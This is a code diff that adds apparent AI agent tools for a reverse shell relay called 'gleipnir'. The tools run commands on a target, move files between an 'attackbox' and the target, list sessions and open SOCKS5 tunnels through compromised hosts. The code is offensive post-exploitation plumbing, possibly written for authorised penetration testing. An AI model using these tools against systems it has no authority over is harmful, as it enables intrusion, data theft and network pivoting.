@@ -333,6 +333,100 @@ server.tool(
   },
 );
 
+// --- Gleipnir (reverse shell relay) -----------------------------------------
+
+const GLEIPNIR_SOCK = process.env.PK_GLEIPNIR_SOCK ?? "/tmp/gleipnir.sock";
+
+async function gleipnirApi(request: Record<string, unknown>): Promise<Record<string, unknown>> {
+  const net = await import("node:net");
+  return new Promise((resolve, reject) => {
+    const client = net.createConnection(GLEIPNIR_SOCK, () => {
+      client.write(JSON.stringify(request) + "\n");
+    });
+    let data = "";
+    client.on("data", (chunk: Buffer) => { data += chunk.toString(); });
+    client.on("end", () => {
+      try { resolve(JSON.parse(data.trim())); }
+      catch { reject(new Error(`invalid response: ${data}`)); }
+    });
+    client.on("error", (err: Error) => {
+      reject(new Error(`gleipnir relay not reachable: ${err.message}`));
+    });
+  });
+}
+
+server.tool(
+  "gleipnir_exec",
+  "Execute a command on a target via a gleipnir reverse shell session. Use instead of tooling_exec when you have an active gleipnir session on the target.",
+  {
+    session: z.string().describe("Session name (from gleipnir_sessions)"),
+    command: z.string().describe("Shell command to execute on the target"),
+    timeout: z.number().optional().describe("Timeout in seconds (default 300)"),
+  },
+  async ({ session, command, timeout }: { session: string; command: string; timeout?: number }) => {
+    const resp = await gleipnirApi({ action: "exec", session, command, timeout: timeout ?? 300 });
+    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+    return { content: [{ type: "text" as const, text: (resp.data as Record<string, string>).output }] };
+  },
+);
+
+server.tool(
+  "gleipnir_upload",
+  "Upload a file to a target through a gleipnir session.",
+  {
+    session: z.string().describe("Session name"),
+    src: z.string().describe("Local source file path (on the attackbox)"),
+    dst: z.string().describe("Remote destination path (on the target)"),
+  },
+  async ({ session, src, dst }: { session: string; src: string; dst: string }) => {
+    const resp = await gleipnirApi({ action: "upload", session, src, dst });
+    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+    return { content: [{ type: "text" as const, text: `Uploaded ${src} -> ${dst}` }] };
+  },
+);
+
+server.tool(
+  "gleipnir_download",
+  "Download a file from a target through a gleipnir session.",
+  {
+    session: z.string().describe("Session name"),
+    src: z.string().describe("Remote source file path (on the target)"),
+    dst: z.string().describe("Local destination path (on the attackbox)"),
+  },
+  async ({ session, src, dst }: { session: string; src: string; dst: string }) => {
+    const resp = await gleipnirApi({ action: "download", session, src, dst });
+    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+    const data = resp.data as Record<string, unknown>;
+    return { content: [{ type: "text" as const, text: `Downloaded ${src} -> ${dst} (${data.size} bytes)` }] };
+  },
+);
+
+server.tool(
+  "gleipnir_sessions",
+  "List active gleipnir reverse shell sessions.",
+  async () => {
+    const resp = await gleipnirApi({ action: "sessions" });
+    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+    return { content: [{ type: "text" as const, text: JSON.stringify(resp.data, null, 2) }] };
+  },
+);
+
+server.tool(
+  "gleipnir_tunnel",
+  "Start or stop a SOCKS5 proxy tunnel through a gleipnir session.",
+  {
+    session: z.string().describe("Session name"),
+    port: z.number().describe("Local SOCKS5 port (e.g. 1080)"),
+    stop: z.boolean().optional().describe("Set true to stop the tunnel"),
+  },
+  async ({ session, port, stop }: { session: string; port: number; stop?: boolean }) => {
+    const resp = await gleipnirApi({ action: "socks", session, port, stop: stop ?? false });
+    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+    const msg = stop ? `Tunnel stopped for '${session}'` : `SOCKS5 proxy for '${session}' on 127.0.0.1:${port}`;
+    return { content: [{ type: "text" as const, text: msg }] };
+  },
+);
+
 // ---------------------------------------------------------------------------
 
 async function main() {
